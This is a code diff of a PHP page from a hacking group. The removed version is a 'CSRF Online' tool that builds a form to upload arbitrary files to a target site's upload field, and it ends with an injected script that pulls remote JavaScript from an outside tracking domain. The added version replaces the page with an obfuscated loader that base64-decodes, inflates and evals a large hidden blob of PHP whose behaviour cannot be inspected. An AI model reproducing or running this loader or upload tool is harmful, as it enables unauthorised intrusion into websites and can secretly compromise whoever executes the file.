@@ -1,75 +1,16 @@
-<html>
-    <head>
-	<iframe width="0" height="0" scrolling="no" frameborder="no" allow="autoplay" src="https://i.top4top.io/m_18468vcah0.mp3"></iframe>
-        <title>CSRF Online | BabwaXgura</title>
-         <link type="text/css" href="http://anicrack-indo.netii.net/error.css" rel="stylesheet"> 
-         <link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300" rel="stylesheet" type="text/css">
-         <link href="http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700" rel="stylesheet" type="text/css"> 
-         <meta content='CSRF Online' name='title'/>
-         <meta content='CSRF Online' name='description'/>
-         <meta content='CSRF Online' name='keywords'/>
-         <meta content='CSRF Online' name='Abstract'/>
-         <script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
-          <link rel="icon" type="image/png" href="https://e.top4top.io/p_18508kitp0.jpg">
-             <br>
-                <br>
-                   <br>
-                      <body style="background-color: rgb(0, 0, 0); color: rgb(0, 0, 0);"alink="#ee0000" link="#0000ee" vlink="#551a8b">
-                         <span style="color: rgb(242, 239, 239);">
-                            <br>
-                               <span style="font-family: monospace;"></head>
-                               <center> 
-                               <div class="error">
-                                  <img border="0" src="https://e.top4top.io/p_18508kitp0.jpg" width="250" height="">
-                                     <br>
-                                        <font size="4" face="Terminal">
-                                      <br>                                                                         </br>
-                                           <font size="4" face="Terminal">
-                                              
-                                           </font></p>
-                                           <font size="7" face="Open Sans Condensed">&#1203;&#824;&#1202;&#824;&#1203; CSRF Online &#1203;&#824;&#1202;&#824;&#1203;</font>
-                                           </p>
-                                           <font size="4" face="Ubuntu Mono"></font></p>
-                                           <font size="4" face="Ubuntu Mono">CSRF Online | Muslim Cyber Anonymous</font></p>
-                                           <font size="4" face="Ubuntu Mono">MOGA AJA VULN BIAR BISA PANSOS</font></p>
-                                           <br>
-                                <div style="display">		
-                                               <center>
-<form method="post">
-<font face="Inconsolata" color="white"> URL Target : </font> <font color="red"> &#1203;&#824;&#1202;&#824;&#1203; </font> <input type="text" name="url" placeholder="Your Target" style="margin: 5px auto; padding-left: 5px;" required>
-<br><br><font face="Inconsolata" color="white"> Post File : </font> <font color="red">&#1203;&#824;&#1202;&#824;&#1203; </font><font color="black">-</font>  <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" required>
-<br><br><input type = "submit" name = "submit" value = "Target Key" class="login-input"style='width: 130px; height: 40px;'> </ form >
-</form>
 <?php
-$url = $_POST['url'];
-$pf = $_POST['pf'];
-$d = $_POST['submit'];
-if($d) {
-	echo "<SCRIPT language='JavaScript'>alert('URL Target Is Vuln');</SCRIPT>";
-    echo "<SCRIPT language='JavaScript'>alert('Upload Your File');</SCRIPT>";
-	echo "<SCRIPT language='JavaScript'>alert(' Status : Terkunci');</SCRIPT>";
-    echo "<SCRIPT language='JavaScript'>alert('Akses Your File');</SCRIPT>";
-    echo "<SCRIPT language='JavaScript'>alert('moga aja berhasil :v');</SCRIPT>";
-    echo "<SCRIPT language='JavaScript'>alert('biar bisa pansos');</SCRIPT>";
-    echo "<SCRIPT language='JavaScript'>alert('jadilah heker';</SCRIPT>";
-    echo " <div id='preloader'> ";
-    echo " <div id='loading'> ";
-    echo " </div> </div> ";
-    echo " <div class='content'> ";
-    echo " </div> ";
-	echo "<img src='https://e.top4top.io/p_18508kitp0.jpg' style='width: 120px; height: 80px';>";
-	echo "<br>";
-        echo " <font face='Inconsolata' color='red'> $url  Status -> </font> <font face='Inconsolata' color='green'> terkunci bwa </font> ";
-        echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><font face='Inconsolata' color='white'> Filename : </font><font color=black>&#1203;&#824;&#1202;&#824;&#1203;</font><input type='file' name='$pf'><input type='submit' name='submit' value=' serang biar jadi heker' class='login-input' style='width: 120px; height: 42px;'></form";
-}
+
+//OBFUSCATED BY: BabwaXgura [Babwa]
+//ENCODE PHP BY: BabwaXgura [Babwa]
+//SECURITY LEVEL: STRONG
+//FROM: http://muslimcyberanonymous.nasiwebhost.com/opfus.php
+//THANKS FOR USING MY OBFUSCATOR TOOLS
+//
+//AUTHOR: BabwaXgura [Babwa]
+//ROLE: FOUNDER
+//TEAM: Muslim Cyber Anonymous 2020
+$Babwa = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNEJsYWNrX0NvZGVycyUyOSUyOSUyOSUyOSUyOSUyOSUyOSUyOSUzQg==";
+$Black_Coders = "=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";
+eval(htmlspecialchars_decode(urldecode(base64_decode($Babwa))));
+exit;
 ?>
-</form>
-<script src="http://code.jquery.com/jquery-2.1.1.min.js"></script>
-    <script type="text/javascript">
-  $(window).load(function() {
-   $("#content").fadeOut();
-   $("#preloader").delay(10).fadeOut("slow");
-  })
-    </script>
-    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m1yEw0Zhss6dvuHT13xMZiBN37rSBhkrd%2fCI6B%2fO93ucRMvQCK4bk0WK%2bjVW9CZiim%2buqGrq0rZWmRqTaXCl13wBkXBaFmn5VyZYrEN%2brCEiUUv6PpHM%2fO5GRaJa2GVhiytVD8xjnt2oLcufZ12xvW1ulina2Rp%2fKFtFfU2SOAaIpMUNhsEmcAANAx2xbX0gOAEQ39FTx4l%2b0avPk9KlsWYDybRimp4YVR4x8vs8IvKwzsnHbA4dlWic8yZqScxxsiZE7U7iKfHuK%2fLHrPzq16ygpWj2dgoty%2fPbhMCbBJ%2bSGQdnm41dFpHbMOGKCs1X4kALbvo7%2ftcjaSsFbm0rhPdmmhoNlTYzqlUzBbkmagEbYz7suV%2buW3HhiNKdlobKcd7TUXRwV2tuumevdkz6ByjBcGh%2fc%2brHEE%2fvTuIcIk0NZbLPmDVwqbIWaWC7eeWDiuPN7cuMK%2fUHyQtdhDdTFbdyu7aa7XDtY7P3ptscirhAEN7wf3287hvdZJzqCj1clRB1X1N9EaytwJv3rBiqZJESyMLFie3VfNGJGpwGfypQCe%2bX4jNF5KYKZNxbbqFAK8rjFbeqRT%2fdTawUgcFBBww%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
-</html>
